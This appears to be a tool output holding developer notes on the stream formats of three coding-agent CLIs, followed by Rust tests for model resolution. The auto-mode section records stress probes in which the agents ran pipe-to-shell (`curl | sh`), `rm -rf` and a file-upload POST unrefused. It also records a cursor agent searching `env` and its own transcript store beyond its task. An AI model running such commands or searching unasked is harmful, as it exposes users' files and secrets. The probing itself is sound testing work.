 tested: whether plan mode blocks a writing Bash command.\n\n### How often does auto mode refuse, and what does a refusal look like?\n\n0 refusals in 3 probes, with `permissionMode: \"auto\"` confirmed in each `system/init` event:\n\n- `claude/auto-refusal`: `curl -s https://example.com | sh` ran (it failed on HTML). For `rm -rf ~/Downloads/old-builds`, the model checked with `ls` first; the directory was absent.\n- `claude/auto-refusal-exfil`: `curl -X POST --data-binary @calc.py https://httpbin.org/post` ran and the POST succeeded.\n\nNo refusal was captured, so its stream shape is still unknown. The likely shape is a `tool_result` with `is_error: true` plus an entry in the result line's `permission_denials`. The parser should surface `permission_denials` when it is non-empty.\n\nA delegated Claude also loads the user's global instructions. In `claude/auto-fix` it committed the fix on a new branch (`fix-add-operator`) and left the tree clean. The change-set must count commits, not only dirty files.\n\n### Does `--session-id` create the session, and does a second run continue it?\n\nYes, for both pi and Claude.\n\n- **pi:** a first use prints `Warning: No project session found with id '<id>'; creating a new session with that id.` on stderr and exits 0. The second run with the same id (`pi/resume-answer`) prints no warning, and the model answers `392` (previous answer + 1). The `session` header line carries the id.\n- **claude:** `--session-id <uuid>` on the first run, then `--resume <uuid>` (`claude/resume-answer`) answers `392`. The result line keeps the same `session_id`. Untested: reusing `--session-id` on an existing session; the spec uses `--resume`.\n- **cursor:** `--resume <session_id from the result line>` (`cursor/resume-answer`) answers `392`.\n\n### Errors\n\n- **cursor** (`cursor/error-bad-model`): exits 1 with empty stdout. stderr holds the message and the list of valid models.\n- **pi** (`pi/error-bad-model`): **exits 0**. stderr warns `Model \"no-such-model\" not found … Using custom model id.` The stream ends normally with `agent_end`, whose last message has `stopReason: \"error\"` and `errorMessage: \"Codex error: The 'no-such-model' model is not supported …\"`. The parser must read `stopReason`, not the exit code.\n- **claude** (`claude/error-bad-model`): exits 1. stdout has a `result` line with `subtype: \"success\"`, `is_error: true` and the message in `result`. stderr has `[claude-code:unrecognized_model]`. The parser must read `is_error`, not `subtype`.\n\n### Cancelled (SIGTERM to the CLI)\n\nAll three backends exit 143 and stop mid-stream (`*/cancelled`). No `result` or `agent_end` line is written. The supervisor marks CANCELLED itself; nothing in the stream says so.\n\n### NEEDS_CONTEXT\n\nAll three backends end with a question and `STATUS: NEEDS_CONTEXT` in the final text (`*/needs-context`). In a first attempt, cursor searched widely before asking (its own transcript store, `env`, a filesystem glob), which produced a 960KB stream that held the user's MCP tool descriptors. The committed fixture was re-recorded with \"do not search, ask me\".\n\n### Redaction\n\nRaw streams carry the recording user's setup: pi's system-prompt `sections` and extension `toolsAdded`, and Claude's `system/init` lists and `hook_response` output. `scripts/redact.jq` blanks these and keeps the event shapes. `record.sh` applies it and replaces the home-directory name. Any live test that records fixtures (#17 and the per-backend live tests) must use the same filter.\n\n### Cost and usage\n\n- **claude:** `total_cost_usd` on the result line.\n- **cursor:** the result line has `usage` with `inputTokens`, `outputTokens`, `cacheReadTokens` and `cacheWriteTokens`, and no cost.\n- **pi:** `usage.cost` appears on messages. The `agent_end` last-message cost (`$0.00016` in `pi/tool-calls-fix`) looks per-message. #16 should verify whether the run total needs summing over `message_end` events.\n\n### Stream noise the parsers must skip\n\n- **claude:** `system/hook_started`, `system/hook_response` (4 of them from user hooks), `system/commands_changed` and `rate_limit_event` arrive before the assistant turn.\n- **pi:** `entry_appended` and `turn_*`, and a final `agent_settled` after `agent_end`.\n- **cursor:** `thinking/delta` and `thinking/completed`.\n\n\n--\n===\n./config/models.json\n===\n    #[test]\n    fn unknown_id_throws_model_not_allowed() {\n        let (d, m) = base();\n        let e = resolve_model(Some(\"not-listed\"), &(d.as_str(), &m)).unwrap_err();\n        assert!(e.downcast_ref::<ModelNotAllowedError>().is_some());\n    }\n\n    #[test]\n    fn claude_backend_is_not_implemented() {\n        let (d, m) = base();\n        let e = resolve_model(Some(\"claude-sonnet-5-5\"), &(d.as_str(), &m)).unwrap_err();\n        assert_eq!(\n            e.to_string(),\n            \"model \\\"claude-sonnet-5-5\\\" uses backend \\\"claude\\\", which is not implemented yet\"\n        );\n    }\n\n    #[test]\n    fn pi_backend_is_not_implemented() {\n        let (d, m) = base();\n        let e = resolve_model(Some(\"openai-codex/gpt-6-luna\"), &(d.as_str(), &m)).unwrap_err();\n        assert_eq!(\n            e.to_string(),\n            \"model \\\"openai-codex/gpt-6-luna\\\" uses backend \\\"pi\\\", which is not implemented yet\"\n        );\n    }\n}\n"}],"isError":false,"timestamp":1790855574539}]}
